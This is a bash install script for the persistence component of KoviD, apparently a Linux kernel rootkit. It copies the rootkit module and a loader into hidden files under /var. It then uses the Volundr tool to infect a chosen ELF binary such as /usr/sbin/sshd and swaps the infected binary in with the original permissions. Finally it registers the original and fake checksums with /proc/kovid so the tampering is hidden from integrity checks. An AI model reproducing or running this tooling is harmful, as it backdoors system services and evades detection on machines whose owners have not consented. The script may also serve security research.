#!/usr/bin/env bash
#
# Install KoviD persistence
# -hash

set -eou pipefail

PREFIX="/${0%/*}"
PREFIX=${PREFIX:-.}
PREFIX=${PREFIX#/}/
PREFIX=$(cd "$PREFIX"; pwd)

# Defaults
# Warning: avoid changing these variables
INSTALL="/var"
VOLUNDR=${VOLUNDR:-$PREFIX/../volundr}
KOVID=${KOVID:-$PREFIX/../kovid.ko}
LOADER=${LOADER:=$PREFIX/../src/loadmodule.sh}

BKPDIR="$PREFIX"/elfbkp

    usage="Use: [override variables] ./${0##*/} <ELF executable>

    override defaults: VOLUNDR, KOVID, LOADER

    VOLUNDR: point to Volundr directory entry point
        default: ../volundr

    KOVID:  point to KoviD module
        default: ../kovid

    LOADER: point to loader script
        default: ../loadmodule.sh

    Examples:
        # ./${0##*/} /usr/sbin/sshd
        # VOLUNDR=/tmp/Volundr ./${0##*/} /usr/sbin/sshd
        # KOVID=/tmp/kovid.ko LOADER=/tmp/loadmodule.sh ./${0##*/} /usr/sbin/sshd
        $ sudo KOVID=/root/kovid.ko ./${0##*/} /usr/sbin/sshd

    Before running this script, make sure to:
    KoviD:      build and insmod
    Volundr:    build"

errexit() {
    echo "Error: $1"
    if [[ "$2" == true ]]; then
        echo "$usage"
    fi
    exit "$3"
} >&2

check_util() {
    for u in "$@"; do
        if [[ ! $(which "$u") ]]; then
            echo "Error: $u not found"
            exit 1
        fi
    done
} >&2

function do_install_files_error() {
    rm -fv "$INSTALL"/.kv.ko
    rm -fv "$INSTALL"/.lm.sh
}

function do_install_files() {
    local rc=0

    cp -v "$KOVID" "$INSTALL"/.kv.ko || rc=1
    cp -v "$LOADER" "$INSTALL"/.lm.sh || rc=1

    return $rc
}

function do_persist() {
    local target="$1"

    if [[ ! -f "$target" ]]; then
        errexit "Target ELF file not found" true 1
    fi

    # Check it target file is and ELF binary
    readelf -h "$target" || false

    # Save original target checksum
    # This will be used later for KoviD -m
    chksum_orig="$(md5sum "$target"| cut -d " " -f1)"

    # After copying the hijacked binary, update
    # permissions to match the original
    perm="$(stat -c '%a' "$target")"

    do_install_files || {
        echo "Error preparing environment" >&2
        false
    }

    # Prepare backup of original target
    mkdir -p "$BKPDIR"
    echo "$target" "$BKPDIR"
    cp -v "$target" "$BKPDIR" || {
        do_install_files_error
        false
    }

    d="$(date "+%m_%d_%y_%s")"
    vfbkp="$BKPDIR"/"$(basename "$target")"."$d"
    cp -v "$target" "$vfbkp"

    # Volundr target file
    vf="$BKPDIR"/"$(basename "$target")"

    # Infect target
    pushd "$VOLUNDR" && {
        source completion.sh
        ./run example-infect-text "$vf" ../src/persist || {
            rm -f "$vf" "$vfbkp"
            do_install_files_error
            false
        }
        popd
    }

    # Go ahead and remove the target
    # before copying our hijacked version
    rm -fv "$target" || {
        rm -f "$vf" "$vfbkp"
        do_install_files_error
        false
    }
    cp -v "$vf" "$target" || {
        # oops
        echo "!! Failed to copy file !!"
        echo "Backup exists at:" "$BKPDIR"/"$(basename "$target")".bkp
        rm -f "$vf"
        false
    }
    chmod "$perm" "$target"

    chksum_fake="$(md5sum "$vf"| cut -d " " -f1)"

    # Add new checksum
    echo "-m $chksum_orig $chksum_fake" >/proc/kovid
    echo "Success $chksum_fake $chksum_orig"

    rm -f "$vf"

    echo "Done"
}

if [[ ! -f "$VOLUNDR"/volundr/libvolundr.so ]]; then
    errexit "$VOLUNDR: Invalid voludnr directory or Volundr not built" true 1
fi

if [[ "1" -ne "$#" ]]; then
    errexit "Missing/Invalid parameter" true 1
fi

check_util readelf md5sum mktemp stat

if [[ ! -f /proc/kovid ]]; then
    errexit "KoviD not running" true 1
fi

do_persist "$1"

echo "Done!"
